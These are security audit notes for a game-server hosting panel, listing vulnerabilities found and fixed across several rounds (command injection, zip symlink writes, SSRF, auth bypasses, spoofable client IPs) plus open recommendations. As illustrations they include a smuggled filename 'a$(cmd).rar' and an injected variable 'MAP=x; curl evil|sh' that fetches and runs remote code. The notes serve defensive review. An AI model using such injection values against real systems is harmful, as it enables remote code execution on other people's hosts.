# Security audit notes

Scope: static review of the panel source (no live penetration test, backend not run against a real
Docker host). Everything below was verified with a test or a reproduction unless marked otherwise.

## Fixed

| # | Severity | Issue | Fix |
|---|----------|-------|-----|
| 1 | **High** | **Command injection in .rar extraction.** `unrar`/`7z` ran through a shell with `JSON.stringify(path)`, which does not escape `$()` or backticks. A user uploading a file named `a$(cmd).rar` could run commands on the host. Reproduced before the fix. | `execFile` (no shell). |
| 2 | **High** | **`extract-zip` symlink / arbitrary-file-write advisories** (no upstream fix). Used on user-uploaded zips, modpacks and worlds. | Replaced with `utils/safeZip.ts` (yauzl): rejects `..`/absolute paths, never creates symlinks, refuses to write through symlinked dirs, strips setuid/setgid, caps entries and size. Symlinks left by unrar/7z are removed. |
| 3 | **High** | **Host shell injection through egg variables** in the native (no-Docker) engine: an editable variable such as `MAP=x; curl evil|sh` was substituted into a host `sh -c`. | Values containing shell control characters are dropped (`utils/shellVars.ts`). |
| 4 | Medium | Docker image names from eggs were interpolated into `docker pull …`. | Name validated, `execFile` used. |
| 5 | Medium | `git clone` / `chmod` built as shell strings. | `execFile` with `--` and argument arrays. |
| 6 | Medium | Admin "install from URL" had no SSRF guard (could fetch localhost / cloud metadata). | `assertPublicHttpUrl` + timeout. |
| 7 | Medium | Modrinth installs picked the newest file of *any* loader. | Filtered by loader and Minecraft version. |
| 8 | Medium | RCON/console button inputs could carry line breaks (second command). | Line breaks stripped. |
| 9 | — | 22 npm advisories (1 critical, 16 high). | `npm audit fix`, plus removed the unused `extract-zip` dependency → 4 remaining (see below). |

## Already good (verified in code)
- Every `/api/servers/:id/*` route passes `requireAuth` plus an owner / sub-user / staff check.
- Admin-only endpoints (resources, suspend, owner, startup, version, terminate…) check the role.
- Symlink-aware `isInside` / `safeResolve`, server-id validation, SSRF helper, helmet, CORS allow-list,
  rate limiters on auth, random JWT secret persisted with mode 0600, session tokens separated from 2FA tokens.

## Round 2 (hardening pass)

| # | Severity | Issue | Fix |
|---|----------|-------|-----|
| 10 | **High** | **API-key auth failed open.** In `requireAuth`, a key whose creator account had been deleted kept `role = "admin"`. | Rejected with 401; auth logic de-duplicated into one code path shared by `requireAuth` / `requireAdmin`. |
| 11 | **High** | **Spoofable client IP.** `getClientIp` trusted the raw `X-Forwarded-For` header, so anyone could bypass IP bans and forge the activity log; behind a proxy the login limiter saw every user as one IP. | Uses Express `req.ip` with a configured `trust proxy` (`TRUST_PROXY`, default `loopback`). |
| 12 | Medium | `contentSecurityPolicy` was disabled. | Enforced in production (`script-src 'self'` + Google login, `object-src 'none'`, `frame-ancestors 'self'`, `base-uri`, `form-action`). `CSP_MODE=report-only\|off` to override. |
| 13 | Medium | JSON/urlencoded bodies allowed up to 50 MB on every route. | 5 MB default (`JSON_BODY_LIMIT`). Uploads use multer and are unaffected. |
| 14 | Medium | Shared default `RCON_PASSWORD=admin` for every Minecraft container. | Random per container. |
| 15 | Medium | JSON data files written non-atomically (crash = truncated `users.json`), world-readable, racing writers, corrupt files silently treated as empty. | Atomic temp-file + rename, mode 0600, per-file write queue, `updateJSON` helper, corrupt files copied aside, file names validated. |
| 16 | Medium | 6 high + 2 critical npm advisories (grpc-js, tinypool, vite, follow-redirects). | `npm audit` now reports 0 (`overrides` for `@grpc/grpc-js`, vitest 5). CI fails on high advisories. |
| 17 | Low | `exec` with shell strings for pm2 / update.sh. | `execFile` with argument arrays (ids were already validated; this removes the shell entirely). |
| 18 | Low | Uncaught exceptions were swallowed and the process kept running in an undefined state. | Log to `.data/crash.log`, exit, let pm2 restart (with restart back-off). Graceful SIGTERM/SIGINT. |
| 19 | Low | bcrypt cost 10, `Math.random` in user ids, `crypto` npm placeholder package, duplicate native `bcrypt`. | Cost 12 for new hashes, `crypto.randomBytes`, packages removed (sftp now uses `bcryptjs`; hashes are compatible). |
| 20 | Low | No `.gitignore` (risk of committing `.env`, `.data`). | Added, plus `.env.example`. |

## Still open / recommended
- **API key scopes are stored but never enforced** - every key acts with its creator's full role. Enforce scopes per route or hide the scope option.
- Docker engine still `chmod -R 777` on server folders (per-server UIDs would fix it).
- `playit` and `test_playit` are identical 3 MB binaries committed to the repo; download and checksum-verify the official release instead.
- Rate limits are per-IP only; consider per-username lockout on login.
- Egg library defaults (`RCON_PASSWORD: "admin"` metadata in `controllers/eggs.ts`) are display defaults only now, but should be removed.
- Pentest before exposing to untrusted users.

## Round 3 (targeted fix pass) - see docs/TARGETED_FIXES.md

Critical: `/api/auth/google` trusted an unverified email from the request body (auth + 2FA bypass); fixed with
server-side Firebase ID token verification. Also: per-account login/2FA lockout, TOTP replay protection, API key
scope enforcement, `DELETE /files` on the server root, chunk-upload collisions, upload size cap, per-user limiters,
a working jailed SFTP server with brute-force throttling, health endpoint, config validation, graceful shutdown,
and `npm run backup` / `npm run restore`. The "API key scopes never enforced" and "rate limits per-IP only" items
below are resolved; rate-limit counters remain in memory (single instance).

## Round 1 notes (original)
### Remaining / recommended (superseded where fixed above)
- `firebase` → `@grpc/grpc-js` advisories (4 high): only fixable with a breaking firebase upgrade. The panel
  only imports `firebase/app` and `firebase/auth` (browser Google login); Firestore / gRPC is never used.
- The Docker engine runs containers with a world-writable (777) server folder; consider per-server UIDs.
- Get an independent pentest before exposing the panel to untrusted users on the internet.
